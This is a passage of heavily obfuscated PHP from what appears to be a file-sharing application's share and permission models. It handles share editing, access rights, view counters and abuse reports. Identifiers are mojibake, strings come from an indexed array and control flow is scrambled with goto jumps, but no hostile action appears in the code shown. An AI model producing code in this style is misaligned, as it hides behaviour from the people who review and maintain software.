bÙÆÅ¸Å†Á: if ($d÷Î„±Š == 0) { $E”˜‘Ôã = array($Eƒ¹…¾¬¼[1870] => $A·ÒßĞï÷[$Eƒ¹…¾¬¼[1095]], $Eƒ¹…¾¬¼[1542] => $cÁğ…Íïëó); } if ($bËâ®É›ù = $this->where($E”˜‘Ôã)->find()) { return $bËâ®É›ù[$Eƒ¹…¾¬¼[483]]; } if ($d÷Î„±Š == 0) { $e£›¿Æ·¤ = array($Eƒ¹…¾¬¼[28] => get_path_this($A·ÒßĞï÷[$Eƒ¹…¾¬¼[76]])); } else { $e£›¿Æ·¤ = Model($Eƒ¹…¾¬¼[816])->sourceInfo($d÷Î„±Š); if (!$e£›¿Æ·¤) { return !1; } } goto Eô×ğ­Î…; a†­èõ¨œ‚: } private function _shareAuthSet($Aöá°Øã‹ã, $c‹ÉÃ—’) { goto e¸œù”ë•İ; e¸œù”ë•İ: $AÇñÂæì•¶ =& $_SERVER[›èö’ù¤]; if (!is_array($c‹ÉÃ—’)) { return !1; } $CìµŠ“ìÎº = Model($AÇñÂæì•¶[1824]); goto eÏô¦½ç¹ ; eÏô¦½ç¹ : $CìµŠ“ìÎº->where(array($AÇñÂæì•¶[483] => $Aöá°Øã‹ã))->delete(); $EƒÌ†š¸á‹ = array(); foreach ($c‹ÉÃ—’ as $BÙØ¸øõŠñ) { $C°Ÿ„ÖŞÁˆ = SourceModel::TYPE_USER; if ($BÙØ¸øõŠñ[$AÇñÂæì•¶[406]] == SourceModel::TYPE_GROUP) { $C°Ÿ„ÖŞÁˆ = SourceModel::TYPE_GROUP; } $aÁ›´ÈÌ‚ = array($AÇñÂæì•¶[483] => $Aöá°Øã‹ã, $AÇñÂæì•¶[406] => $C°Ÿ„ÖŞÁˆ, $AÇñÂæì•¶[499] => intval($BÙØ¸øõŠñ[$AÇñÂæì•¶[499]]), $AÇñÂæì•¶[1820] => 0, $AÇñÂæì•¶[1874] => -1); if ($BÙØ¸øõŠñ[$AÇñÂæì•¶[1820]]) { $aÁ›´ÈÌ‚[$AÇñÂæì•¶[1820]] = $BÙØ¸øõŠñ[$AÇñÂæì•¶[1820]]; } else { if ($BÙØ¸øõŠñ[$AÇñÂæì•¶[1874]]) { $aÁ›´ÈÌ‚[$AÇñÂæì•¶[1874]] = $BÙØ¸øõŠñ[$AÇñÂæì•¶[1874]]; } } $EƒÌ†š¸á‹[] = $aÁ›´ÈÌ‚; } goto dÑë†˜šºĞ; dÑë†˜šºĞ: return $CìµŠ“ìÎº->addAll($EƒÌ†š¸á‹, array(), !0); goto aˆğ˜äÖ²›; aˆğ˜äÖ²›: } public function numViewAdd($D‡˜ÎÇµÊ) { $Bğë—Ô½†Ñ =& $_SERVER[›èö’ù¤]; $A·Š†Î¤Ê = array($Bğë—Ô½†Ñ[482] => $D‡˜ÎÇµÊ); $this->where($A·Š†Î¤Ê)->setAdd($Bğë—Ô½†Ñ[1871]); } public function numDownloadAdd($Dñ«³Ğ±’) { $eò›ÙÜŞÀ =& $_SERVER[›èö’ù¤]; $f®îÇ©ÓîŒ = array($eò›ÙÜŞÀ[482] => $Dñ«³Ğ±’); $this->where($f®îÇ©ÓîŒ)->setAdd($eò›ÙÜŞÀ[1872]); } protected function shareEdit($CÂù˜Ï×¼º, $AÚ¨ƒÛ®ÑÈ) { goto a¨×ÉµïËÔ; Cœ©‘ºÈ¡¯: foreach ($E¥Ó´½”Ò as $aÙåŒ„ÃÛÅ) { if (!array_key_exists($aÙåŒ„ÃÛÅ, $AÚ¨ƒÛ®ÑÈ)) { continue; } $dâçãòÖ†[$aÙåŒ„ÃÛÅ] = $AÚ¨ƒÛ®ÑÈ[$aÙåŒ„ÃÛÅ]; } $this->shareEventAdd($fİ”äõòØ[$A– ¿ÅÃ¸[397]], $AÚ¨ƒÛ®ÑÈ, $A– ¿ÅÃ¸[1687]); $this->where(array($A– ¿ÅÃ¸[482] => $CÂù˜Ï×¼º))->save($dâçãòÖ†); goto bÛÅ¶˜µ; bÛÅ¶˜µ: if (isset($AÚ¨ƒÛ®ÑÈ[$A– ¿ÅÃ¸[1864]])) { $this->_shareAuthSet($CÂù˜Ï×¼º, $AÚ¨ƒÛ®ÑÈ[$A– ¿ÅÃ¸[1864]]); } return !0; goto C«Æç’”æ; a¨×ÉµïËÔ: $A– ¿ÅÃ¸ =& $_SERVER[›èö’ù¤]; $fİ”äõòØ = $this->getInfo($CÂù˜Ï×¼º); if (!$fİ”äõòØ) { return !1; } goto Dæùô®ìÑÓ; Dæùô®ìÑÓ: $this->_checkLinkShare($AÚ¨ƒÛ®ÑÈ, $fİ”äõòØ); $dâçãòÖ† = array(); $E¥Ó´½”Ò = explode($A– ¿ÅÃ¸[47], $A– ¿ÅÃ¸[1875]); goto Cœ©‘ºÈ¡¯; C«Æç’”æ: } private function _checkLinkShare($dî ¦òù¥ç, $Bùù™ƒŠÄ§) { goto Aöëõ´Ê×; EÈÎºÅº‚: $a¬‡—¨á¾Ù = $this->shareFileMeta($E‡Â‰ñÜ˜î[$Dö‰Î™´‘Í[462]]); if (isset($a¬‡—¨á¾Ù[$Dö‰Î™´‘Í[372]]) && $a¬‡—¨á¾Ù[$Dö‰Î™´‘Í[372]] == $Dö‰Î™´‘Í[87]) { show_json(LNG($Dö‰Î™´‘Í[1878]), !1); } goto bğ”ä÷ƒ¼; Aöëõ´Ê×: $Dö‰Î™´‘Í =& $_SERVER[›èö’ù¤]; if ($dî ¦òù¥ç[$Dö‰Î™´‘Í[488]] != $Dö‰Î™´‘Í[87]) { return; } $c•¦Ä‰Ô¥™ = $Bùù™ƒŠÄ§[$Dö‰Î™´‘Í[85]][$Dö‰Î™´‘Í[397]]; goto Fæ²¸áÆåÏ; Fæ²¸áÆåÏ: if ($Bùù™ƒŠÄ§[$Dö‰Î™´‘Í[85]][$Dö‰Î™´‘Í[29]] != $Dö‰Î™´‘Í[193]) { $D¾¢²ÙâÈŠ = $this->_folderReport($c•¦Ä‰Ô¥™); if (!$D¾¢²ÙâÈŠ) { return; } show_json(LNG($Dö‰Î™´‘Í[1876]) . $Dö‰Î™´‘Í[1877] . $D¾¢²ÙâÈŠ, !1); } $E‡Â‰ñÜ˜î = Model($Dö‰Î™´‘Í[816])->fileInfoGet($Bùù™ƒŠÄ§[$Dö‰Î™´‘Í[85]][$Dö‰Î™´‘Í[397]]); if (!$E‡Â‰ñÜ˜î) { return; } goto EÈÎºÅº‚; bğ”ä÷ƒ¼: } private function _folderReport($Bíñ¶Ó¹Ç‡) { goto A±ÅùÄÉìÉ; Dæ‘†”¶Œ“: if (!$a½Û˜»çÂ) { return !1; } $a½Û˜»çÂ = array_to_keyvalue($a½Û˜»çÂ, $B±¢ôó×¹[33], $B±¢ôó×¹[462]); $Fä§‡Šêä = $B±¢ôó×¹[47] . $Bíñ¶Ó¹Ç‡ . $B±¢ôó×¹[47]; goto F²¯ùÕŠ„¤; BÉ›ç­á¼‹: $D™¦Ù“ÛÓ¶ = substr($dÄ£øğ ‰[$B±¢ôó×¹[516]], strpos($dÄ£øğ ‰[$B±¢ôó×¹[516]], $Fä§‡Šêä)); $E±ƒÙï™§ = array($B±¢ôó×¹[397] => array($B±¢ôó×¹[7], trim($D™¦Ù“ÛÓ¶, $B±¢ôó×¹[47]))); $C”‰öŒêêá = Model($B±¢ôó×¹[816])->where($E±ƒÙï™§)->field($B±¢ôó×¹[28])->select(); goto dù…“ªÃÇ·; dù…“ªÃÇ·: $b˜âªÕ•¨° = array_to_keyvalue($C”‰öŒêêá, $B±¢ôó×¹[33], $B±¢ôó×¹[28]); $b˜âªÕ•¨°[] = $dÄ£øğ ‰[$B±¢ôó×¹[28]]; return implode($B±¢ôó×¹[8], $b˜âªÕ•¨°); goto B‘»ğØ˜›¨; F²¯ùÕŠ„¤: $E±ƒÙï™§ = array($B±¢ôó×¹[462] => array($B±¢ôó×¹[7], $a½Û˜»çÂ), $B±¢ôó×¹[516] => array($B±¢ôó×¹[381], "\x25{$Fä§‡Šêä}\x25"), $B±¢ôó×¹[425] => 0); $dÄ£øğ ‰ = Model($B±¢ôó×¹[816])->where($E±ƒÙï™§)->field($B±¢ôó×¹[1880])->find(); if (!$dÄ£øğ ‰) { return !1; } goto BÉ›ç­á¼‹; A±ÅùÄÉìÉ: $B±¢ôó×¹ =& $_SERVER[›èö’ù¤]; $E±ƒÙï™§ = array($B±¢ôó×¹[462] => array($B±¢ôó×¹[995], 0), $B±¢ôó×¹[734] => 3); $a½Û˜»çÂ = Model($B±¢ôó×¹[1879])->where($E±ƒÙï™§)->field($B±¢ôó×¹[462])->select(); goto Dæ‘†”¶Œ“; B‘»ğØ˜›¨: } protected function remove($D„‚È‹æ­Ç) { goto f××ç´Ùî¨; fí‘ŠåëØô: $Fåéñ²Û  = $this->where($eÉÁœ÷¹ˆÇ)->delete(); if ($Fåéñ²Û ) { Model($AÙÑòÓ¨Ñ„[591])->where(array($AÙÑòÓ¨Ñ„[483] => $D„‚È‹æ­Ç))->delete(); } $Fº¶™¬¢„ = is_array($D„‚È‹æ­Ç) ? $D„‚È‹æ­Ç[1] : array($D„‚È‹æ­Ç); goto Aò–Ó½‰àª; f××ç´Ùî¨: $AÙÑòÓ¨Ñ„ =& $_SERVER[›èö’ù¤]; if (is_array($D„‚È‹æ­Ç)) { $D„‚È‹æ­Ç = array($AÙÑòÓ¨Ñ„[7], $D„‚È‹æ­Ç); } $eÉÁœ÷¹ˆÇ = array($AÙÑòÓ¨Ñ„[483] => $D„‚È‹æ­Ç); goto fí‘ŠåëØô; Aò–Ó½‰àª: for ($C¯çãÚ’×Ğ = 0; $C¯çãÚ’×Ğ < count($Fº¶™¬¢„); $C¯çãÚ’×Ğ++) { $eÅåµÑˆÚƒ = $this->getInfo($Fº¶™¬¢„[$C¯çãÚ’×Ğ]); if ($eÅåµÑˆÚƒ[$AÙÑòÓ¨Ñ„[490]] == $AÙÑòÓ¨Ñ„[87]) { Model($AÙÑòÓ¨Ñ„[559])->eventShare($eÅåµÑˆÚƒ[$AÙÑòÓ¨Ñ„[397]], $AÙÑòÓ¨Ñ„[1869]); } if ($eÅåµÑˆÚƒ[$AÙÑòÓ¨Ñ„[488]] == $AÙÑòÓ¨Ñ„[87]) { Model($AÙÑòÓ¨Ñ„[559])->eventShare($eÅåµÑˆÚƒ[$AÙÑòÓ¨Ñ„[397]], $AÙÑòÓ¨Ñ„[1868]); } } return $Fåéñ²Û ; goto e’ÇĞÂ¾®; e’ÇĞÂ¾®: } protected function removeBySource($E±‚‹˜Ï±«) { goto dù‘ğ‹ãÍó; dù‘ğ‹ãÍó: $Bé‰÷øÏ·˜ =& $_SERVER[›èö’ù¤]; $b„’Óİ®Ş = array($Bé‰÷øÏ·˜[412] => array($Bé‰÷øÏ·˜[413], $E±‚‹˜Ï±«)); $Eà´Œ¤ñßç = $this->field($Bé‰÷øÏ·˜[483])->where($b„’Óİ®Ş)->select(); goto bôçÒŞØë; FãÃµªˆÄ: $this->where($b„’Óİ®Ş)->delete(); Model($Bé‰÷øÏ·˜[591])->where($b„’Óİ®Ş)->delete(); goto FŒ˜ÂÜ·‡‡; bôçÒŞØë: $Eà´Œ¤ñßç = array_to_keyvalue($Eà´Œ¤ñßç, $Bé‰÷øÏ·˜[33], $Bé‰÷øÏ·˜[483]); if (!$Eà´Œ¤ñßç) { return; } $b„’Óİ®Ş = array($Bé‰÷øÏ·˜[482] => array($Bé‰÷øÏ·˜[413], $Eà´Œ¤ñßç)); goto FãÃµªˆÄ; FŒ˜ÂÜ·‡‡: } public function listAll($A­ÉÙ´§Ä) { goto CõÈ‡“šñ; CÜàéŸ”ŒÀ: return $D•’ŸÁ•‰‹; goto a’Åõ¤ˆôä; CõÈ‡“šñ: $cåöš†ÖŠ =& $_SERVER[›èö’ù¤]; $fÀ•ÄÂòî = array(); if ($A­ÉÙ´§Ä[$cåöš†ÖŠ[1551]]) { $fÀ•ÄÂòî[$cåöš†ÖŠ[1551]] = $A­ÉÙ´§Ä[$cåöš†ÖŠ[1551]]; } goto e»ìÄ‘àŠË; e»ìÄ‘àŠË: if ($A­ÉÙ´§Ä[$cåöš†ÖŠ[745]]) { $Cš¹—ÈÖÎò = $A­ÉÙ´§Ä[$cåöš†ÖŠ[491]] ? $A­ÉÙ´§Ä[$cåöš†ÖŠ[491]] : strtotime(date($cåöš†ÖŠ[1881])); $fÀ•ÄÂòî[$cåöš†ÖŠ[194]] = array($cåöš†ÖŠ[331], array($A­ÉÙ´§Ä[$cåöš†ÖŠ[745]], $Cš¹—ÈÖÎò)); } if ($A­ÉÙ´§Ä[$cåöš†ÖŠ[29]]) { $fÀ•ÄÂòî[$A­ÉÙ´§Ä[$cåöš†ÖŠ[29]]] = 1; } else { $fÀ•ÄÂòî[] = array($cåöš†ÖŠ[488] => array($cåöš†ÖŠ[995], 0), $cåöš†ÖŠ[490] => array($cåöš†ÖŠ[995], 0), $cåöš†ÖŠ[1858] => $cåöš†ÖŠ[1812]); } if ($A­ÉÙ´§Ä[$cåöš†ÖŠ[1808]]) { $fÀ•ÄÂòî[] = array($cåöš†ÖŠ[485] => $A­ÉÙ´§Ä[$cåöš†ÖŠ[1808]], $cåöš†ÖŠ[1454] => array($cåöš†ÖŠ[381], "\x25{$A­ÉÙ´§Ä[$cåöš†ÖŠ[1808]]}\45"), $cåöš†ÖŠ[1858] => $cåöš†ÖŠ[1812]); } goto e‡»ŞƒŒ“; e‡»ŞƒŒ“: $D•’ŸÁ•‰‹ = $this->_makeOrder()->where($fÀ•ÄÂòî)->selectPage(20); if (empty($D•’ŸÁ•‰‹[$cåöš†ÖŠ[367]])) { return array(); } $this->_listDataApply($D•’ŸÁ•‰‹[$cåöš†ÖŠ[367]]); goto CÜàéŸ”ŒÀ; a’Åõ¤ˆôä: } public function listDataApply($DøƒæÁî‡) { $this->_listDataApply($DøƒæÁî‡); return $DøƒæÁî‡; } private function _listDataApply(&$fºÙÙÔõ§¾) { goto b­“ÂÕÅÚ; b­“ÂÕÅÚ: $Aé™§öÄ =& $_SERVER[›èö’ù¤]; $dÏ»Ğæ‰ = array_to_keyvalue($fºÙÙÔõ§¾, $Aé™§öÄ[33], $Aé™§öÄ[1551]); $e©”¥…Ûº = Model($Aé™§öÄ[533])->userListInfo(array_unique($dÏ»Ğæ‰)); goto dšøì§Íß; fæ¢¸æ¦Ä: unset($d–äÜÖÓÖá); $fºÙÙÔõ§¾ = array_values($fºÙÙÔõ§¾); goto BÕ½¼±Òµ; dšøì§Íß: $eÀ‰Æ‡Ìë» = array_to_keyvalue($fºÙÙÔõ§¾, $Aé™§öÄ[33], $Aé™§öÄ[397]); $BØÅèÌì¸Ë = Model($Aé™§öÄ[816])->sourceListInfo($eÀ‰Æ‡Ìë», !0); foreach ($fºÙÙÔõ§¾ as $Bö˜™°ìç… => &$d–äÜÖÓÖá) { $Eœ«Äõñ©Ü = $d–äÜÖÓÖá[$Aé™§öÄ[1551]]; $d–äÜÖÓÖá[$Aé™§öÄ[1882]] = $e©”¥…Ûº[$Eœ«Äõñ©Ü] ? $e©”¥…Ûº[$Eœ«Äõñ©Ü] : !1; $a†ËÉ¹Ü• = $d–äÜÖÓÖá[$Aé™§öÄ[397]]; $d–äÜÖÓÖá[$Aé™§öÄ[85]] = $BØÅèÌì¸Ë[$a†ËÉ¹Ü•] ? $BØÅèÌì¸Ë[$a†ËÉ¹Ü•] : !1; if ($d–äÜÖÓÖá[$Aé™§öÄ[85]][$Aé™§öÄ[425]] == $Aé™§öÄ[87]) { unset($fºÙÙÔõ§¾[$Bö˜™°ìç…]); } if ($d–äÜÖÓÖá[$Aé™§öÄ[85]] != $Aé™§öÄ[191] && !$d–äÜÖÓÖá[$Aé™§öÄ[85]]) { unset($fºÙÙÔõ§¾[$Bö˜™°ìç…]); } } goto fæ¢¸æ¦Ä; BÕ½¼±Òµ: } private function _makeOrder($eÁËé³Íó = '') { goto f½à¨¼¦àÃ; Eå„ÒÕÒëÑ: $DãË¸—†ØÍ = Input::get($F‚ç¹ £ÂÅ[450], $F‚ç¹ £ÂÅ[7], $F‚ç¹ £ÂÅ[418], $CÛãæÒªª÷); $CÉƒØ›À¯Î = Input::get($F‚ç¹ £ÂÅ[451], $F‚ç¹ £ÂÅ[7], $F‚ç¹ £ÂÅ[1883], array($F‚ç¹ £ÂÅ[1807], $F‚ç¹ £ÂÅ[445])); $CÉƒØ›À¯Î = $f¯¬†áç–[$CÉƒØ›À¯Î]; goto a¨”ğê¿©Î; f½à¨¼¦àÃ: $F‚ç¹ £ÂÅ =& $_SERVER[›èö’ù¤]; $CÛãæÒªª÷ = array($F‚ç¹ £ÂÅ[194], $F‚ç¹ £ÂÅ[491], $F‚ç¹ £ÂÅ[1871], $F‚ç¹ £ÂÅ[1872]); $f¯¬†áç– = array($F‚ç¹ £ÂÅ[443] => $F‚ç¹ £ÂÅ[444], $F‚ç¹ £ÂÅ[445] => $F‚ç¹ £ÂÅ[446]); goto Eå„ÒÕÒëÑ; a¨”ğê¿©Î: $eÁËé³Íó = $eÁËé³Íó . "{$DãË¸—†ØÍ}\40{$CÉƒØ›À¯Î}"; return $this->order($eÁËé³Íó); goto Dëä‘ÂâŠ¬; Dëä‘ÂâŠ¬: } public function reportAdd($d¦¥ĞÊÊíÚ) { $E¯„„Ù¡Ë =& $_SERVER[›èö’ù¤]; $f‰“Ï¶–º = array($E¯„„Ù¡Ë[483] => $d¦¥ĞÊÊíÚ[$E¯„„Ù¡Ë[483]], $E¯„„Ù¡Ë[1551] => USER_ID); if (Model($E¯„„Ù¡Ë[1879])->where($f‰“Ï¶–º)->find()) { return !1; } $d¿ç¨®¾•„ = array($E¯„„Ù¡Ë[483] => $d¦¥ĞÊÊíÚ[$E¯„„Ù¡Ë[483]], $E¯„„Ù¡Ë[1454] => $d¦¥ĞÊÊíÚ[$E¯„„Ù¡Ë[1454]], $E¯„„Ù¡Ë[397] => $d¦¥ĞÊÊíÚ[$E¯„„Ù¡Ë[397]], $E¯„„Ù¡Ë[462] => $d¦¥ĞÊÊíÚ[$E¯„„Ù¡Ë[462]], $E¯„„Ù¡Ë[1551] => USER_ID, $E¯„„Ù¡Ë[29] => $d¦¥ĞÊÊíÚ[$E¯„„Ù¡Ë[29]], $E¯„„Ù¡Ë[446] => $d¦¥ĞÊÊíÚ[$E¯„„Ù¡Ë[446]]); return Model($E¯„„Ù¡Ë[1879])->add($d¿ç¨®¾•„); } public function reportList($bæÖÌ¢éˆÖ) { goto DˆÆ–ÌãŞ×; A”°½ÄÔØ: if (empty($BÂÛå„îË´[$Bµôˆ²ÔÄµ[367]])) { return array(); } $D°­…¿èøƒ = array_to_keyvalue_group($BÂÛå„îË´[$Bµôˆ²ÔÄµ[367]], $Bµôˆ²ÔÄµ[734], $Bµôˆ²ÔÄµ[483]); if (!empty($D°­…¿èøƒ[0])) { $bæÖÌ¢éˆÖ = $D°­…¿èøƒ[0]; $fÒƒËÈÃË¸ = array($Bµôˆ²ÔÄµ[483] => array($Bµôˆ²ÔÄµ[7], $bæÖÌ¢éˆÖ)); $dÜ‡™Ã×ŠÏ = $this->where($fÒƒËÈÃË¸)->field($Bµôˆ²ÔÄµ[483])->select(); $dÜ‡™Ã×ŠÏ = array_to_keyvalue($dÜ‡™Ã×ŠÏ, $Bµôˆ²ÔÄµ[33], $Bµôˆ²ÔÄµ[483]); $f™‹ØªàÏ  = array_diff($bæÖÌ¢éˆÖ, $dÜ‡™Ã×ŠÏ); if (!empty($f™‹ØªàÏ )) { foreach ($BÂÛå„îË´[$Bµôˆ²ÔÄµ[367]] as $D´ÓÚî–ó› => $aÔë‡ëÈÄõ) { if (in_array($aÔë‡ëÈÄõ[$Bµôˆ²ÔÄµ[483]], $f™‹ØªàÏ )) { unset($BÂÛå„îË´[$Bµôˆ²ÔÄµ[367]][$D´ÓÚî–ó›]); } } } } goto b£¯ğÊ¥¨; DˆÆ–ÌãŞ×: $Bµôˆ²ÔÄµ =& $_SERVER[›èö’ù¤]; $fÒƒËÈÃË¸ = array(); if ($bæÖÌ¢éˆÖ[$Bµôˆ²ÔÄµ[745]]) { $BÙ½¯© î = $bæÖÌ¢éˆÖ[$Bµôˆ²ÔÄµ[491]] ? $bæÖÌ¢éˆÖ[$Bµôˆ²ÔÄµ[491]] : strtotime(date($Bµôˆ²ÔÄµ[1881])); $fÒƒËÈÃË¸[$Bµôˆ²ÔÄµ[194]] = array($Bµôˆ²ÔÄµ[331], array($bæÖÌ¢éˆÖ[$Bµôˆ²ÔÄµ[745]], $BÙ½¯© î)); } goto CÄƒ×ÂÛÈ³; CÄƒ×ÂÛÈ³: if (isset($bæÖÌ¢éˆÖ[$Bµôˆ²ÔÄµ[29]]) && in_array($bæÖÌ¢éˆÖ[$Bµôˆ²ÔÄµ[29]], array($Bµôˆ²ÔÄµ[87], $Bµôˆ²ÔÄµ[430], $Bµôˆ²ÔÄµ[1884], $Bµôˆ²ÔÄµ[1885], $Bµôˆ²ÔÄµ[1886]))) { $fÒƒËÈÃË¸[$Bµôˆ²ÔÄµ[29]] = $bæÖÌ¢éˆÖ[$Bµôˆ²ÔÄµ[29]]; } if (isset($bæÖÌ¢éˆÖ[$Bµôˆ²ÔÄµ[734]]) && in_array($bæÖÌ¢éˆÖ[$Bµôˆ²ÔÄµ[734]], array($Bµôˆ²ÔÄµ[191], $Bµôˆ²ÔÄµ[87], $Bµôˆ²ÔÄµ[430], $Bµôˆ²ÔÄµ[1884]))) { $fÒƒËÈÃË¸[$Bµôˆ²ÔÄµ[734]] = $bæÖÌ¢éˆÖ[$Bµôˆ²ÔÄµ[734]]; } $C‡ å•õ¹· = Input::get($Bµôˆ²ÔÄµ[451], $Bµôˆ²ÔÄµ[7], $Bµôˆ²ÔÄµ[1883], array($Bµôˆ²ÔÄµ[1807], $Bµôˆ²ÔÄµ[445])); goto DÁí†øé£; b£¯ğÊ¥¨: $this->_listDataApply($BÂÛå„îË´[$Bµôˆ²ÔÄµ[367]]); return $BÂÛå„îË´; goto Dš‡ŠöàêĞ; DÁí†øé£: $aØó¸¬Ÿ¿ô = array($Bµôˆ²ÔÄµ[443] => $Bµôˆ²ÔÄµ[444], $Bµôˆ²ÔÄµ[445] => $Bµôˆ²ÔÄµ[446]); $aÚÑå©ê‡ = $Bµôˆ²ÔÄµ[1887] . $aØó¸¬Ÿ¿ô[$C‡ å•õ¹·]; $BÂÛå„îË´ = Model($Bµôˆ²ÔÄµ[1879])->where($fÒƒËÈÃË¸)->order($aÚÑå©ê‡)->selectPage(20); goto A”°½ÄÔØ; Dš‡ŠöàêĞ: } public function reportStatus($Dô¯‘¹œİÂ) { goto EÇ³÷Ò·½ó; EÇ³÷Ò·½ó: $B˜…ÄàŠ‘ =& $_SERVER[›èö’ù¤]; $f—Â‹šª¬š = array($B˜…ÄàŠ‘[395] => $Dô¯‘¹œİÂ[$B˜…ÄàŠ‘[395]]); $fºÈ†½ˆ„ = Model($B˜…ÄàŠ‘[1879])->where($f—Â‹šª¬š)->field($B˜…ÄàŠ‘[1888])->find(); goto dÙÎù˜’«ñ; B‹Î¯‘ãÇŒ: return $DÌ´Àª±Œë; goto Bªé„‰´ô£; aŠá ğª«Ç: $DÌ´Àª±Œë = Model($B˜…ÄàŠ‘[1879])->where($f—Â‹šª¬š)->save($C“ËÖ¹Í·Ç); if ($Dô¯‘¹œİÂ[$B˜…ÄàŠ‘[734]] == $B˜…ÄàŠ‘[430]) { if ($fºÈ†½ˆ„[$B˜…ÄàŠ‘[462]] != $B˜…ÄàŠ‘[191] && $this->shareFileMeta($fºÈ†½ˆ„[$B˜…ÄàŠ‘[462]])) { $this->shareFileMeta($fºÈ†½ˆ„[$B˜…ÄàŠ‘[462]], 0); } $this->remove($fºÈ†½ˆ„[$B˜…ÄàŠ‘[483]]); return !0; } if ($DÌ´Àª±Œë && $Dô¯‘¹œİÂ[$B˜…ÄàŠ‘[734]] == $B˜…ÄàŠ‘[1884]) { $a¦øÈ‘ìÓ¨ = $C“ËÖ¹Í·Ç[$B˜…ÄàŠ‘[734]] == $B˜…ÄàŠ‘[1884] ? 1 : 0; $this->shareFileMeta($fºÈ†½ˆ„[$B˜…ÄàŠ‘[462]], $a¦øÈ‘ìÓ¨); $this->removeByFile($fºÈ†½ˆ„[$B˜…ÄàŠ‘[462]]); } goto B‹Î¯‘ãÇŒ; dÙÎù˜’«ñ: if (!$fºÈ†½ˆ„) { return !1; } $C“ËÖ¹Í·Ç = array($B˜…ÄàŠ‘[734] => $Dô¯‘¹œİÂ[$B˜…ÄàŠ‘[734]]); if ($Dô¯‘¹œİÂ[$B˜…ÄàŠ‘[734]] == $B˜…ÄàŠ‘[1884] && $fºÈ†½ˆ„[$B˜…ÄàŠ‘[734]] == $B˜…ÄàŠ‘[1884]) { $C“ËÖ¹Í·Ç[$B˜…ÄàŠ‘[734]] = 0; } goto aŠá ğª«Ç; Bªé„‰´ô£: } private function removeByFile($eÍïŸáßˆ) { goto cë™õœ¼; cë™õœ¼: $BÉ“ÔóëŠÇ =& $_SERVER[›èö’ù¤]; $cö¹˜Äâç¹ = Model($BÉ“ÔóëŠÇ[816])->where(array($BÉ“ÔóëŠÇ[462] => $eÍïŸáßˆ))->field($BÉ“ÔóëŠÇ[397])->select(); $CÅ¾„óíæµ = array_to_keyvalue($cö¹˜Äâç¹, $BÉ“ÔóëŠÇ[33], $BÉ“ÔóëŠÇ[397]); goto c±Ö”»…ù; B˜ÉƒŸ—Œ: $Dé¼›í®ÔŠ = array_to_keyvalue($cö¹˜Äâç¹, $BÉ“ÔóëŠÇ[33], $BÉ“ÔóëŠÇ[483]); $this->remove($Dé¼›í®ÔŠ); goto d‡ˆ’«ä¡Ä; c±Ö”»…ù: $Dæìá²ÔœÙ = array($BÉ“ÔóëŠÇ[397] => array($BÉ“ÔóëŠÇ[7], $CÅ¾„óíæµ), $BÉ“ÔóëŠÇ[488] => 1); $cö¹˜Äâç¹ = $this->where($Dæìá²ÔœÙ)->field($BÉ“ÔóëŠÇ[483])->select(); if (empty($cö¹˜Äâç¹)) { return; } goto B˜ÉƒŸ—Œ; d‡ˆ’«ä¡Ä: } private function shareFileMeta($D‹´ÒÜ³ˆ, $BÒ¤Ú™÷ = null) { $BìàÓÏ—˜” =& $_SERVER[›èö’ù¤]; $FíÂ˜·²ù = array($BìàÓÏ—˜”[462] => $D‹´ÒÜ³ˆ, $BìàÓÏ—˜”[93] => $BìàÓÏ—˜”[1889]); if (is_null($BÒ¤Ú™÷)) { return Model($BìàÓÏ—˜”[1890])->where($FíÂ˜·²ù)->find(); } $FíÂ˜·²ù[$BìàÓÏ—˜”[372]] = $BÒ¤Ú™÷; Model($BìàÓÏ—˜”[1890])->add($FíÂ˜·²ù, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\143\x65\x5f\x61\x75\164\150"; public function getAuth($D»“½Ñ) { goto aø•¦’ÎŒ; aø•¦’ÎŒ: $FÖÅåáÜ¤” =& $_SERVER[›èö’ù¤]; $E‹©´¿Í = $this->sourceAuthSelect($D»“½Ñ); $F½¼›ê‡à = array(); goto b²¸£é…™¶; b²¸£é…™¶: $DÈºÒ‘šÕ« = array(); $BñÅÅ¼‚Ê = 2 << 25; foreach ($E‹©´¿Í as $d“ĞŠ¸í–‡) { goto CƒÆÀŸ“áº; A¦ğÕÏ™­¶: $B³ËÈ—„ß = 0; if ($d“ĞŠ¸í–‡[$FÖÅåáÜ¤”[406]] == SourceModel::TYPE_GROUP) { $B³ËÈ—„ß = $BñÅÅ¼‚Ê * 2; } if ($d“ĞŠ¸í–‡[$FÖÅåáÜ¤”[406]] == SourceModel::TYPE_USER) { $B³ËÈ—„ß = $BñÅÅ¼‚Ê; } goto F§ñŸ‹“¤›; CƒÆÀŸ“áº: $f­ÈÖ§Š¢½ = Model($FÖÅåáÜ¤”[502])->listData($d“ĞŠ¸í–‡[$FÖÅåáÜ¤”[1820]]); if (!$f­ÈÖ§Š¢½) { continue; } $F½¼›ê‡à[] = $d“ĞŠ¸í–‡; goto A¦ğÕÏ™­¶; F§ñŸ‹“¤›: if ($d“ĞŠ¸í–‡[$FÖÅåáÜ¤”[406]] == SourceModel::TYPE_USER && $d“ĞŠ¸í–‡[$FÖÅåáÜ¤”[499]] == $FÖÅåáÜ¤”[191]) { $B³ËÈ—„ß = 0; } $DÈºÒ‘šÕ«[] = $f­ÈÖ§Š¢½[$FÖÅåáÜ¤”[408]] + $B³ËÈ—„ß; goto AÚĞ¼¥‰”Ê; AÚĞ¼¥‰”Ê: } goto Bö°æ¾™çá; Bö°æ¾™çá: array_multisort($DÈºÒ‘šÕ«, SORT_DESC, $F½¼›ê‡à); return $F½¼›ê‡à; goto Aë÷„ãùáé; Aë÷„ãùáé: } public function sourceAuthSelect($D¾„¨Ç) { goto B¿×Íğš¯; AŸÂ½ã½ß„: $Bœ½Éà‚ÑÄ = $this->field($C¶Š°±…Í)->order($cİöã‚ïÙï[395])->where($f»œ¿ê‰µ)->select(); $B‹ÖŸ‚ğ£ = array_to_keyvalue_group($Bœ½Éà‚ÑÄ, $cİöã‚ïÙï[397]); foreach ($D¾„¨Ç as $bÀ‹ŒÊÍØ) { $A¬é¨ƒîã’[$bÀ‹ŒÊÍØ] = $B‹ÖŸ‚ğ£[$bÀ‹ŒÊÍØ] ? $B‹ÖŸ‚ğ£[$bÀ‹ŒÊÍØ] : array(); } goto bºİ¢ÇˆØ­; bºİ¢ÇˆØ­: if ($Bä®ÒÉàŞğ) { return $Bœ½Éà‚ÑÄ; } return $B‹ÖŸ‚ğ£; goto f¼À´°ùäÂ; aø¢Áù˜›³: if ($Bä®ÒÉàŞğ) { $D¾„¨Ç = 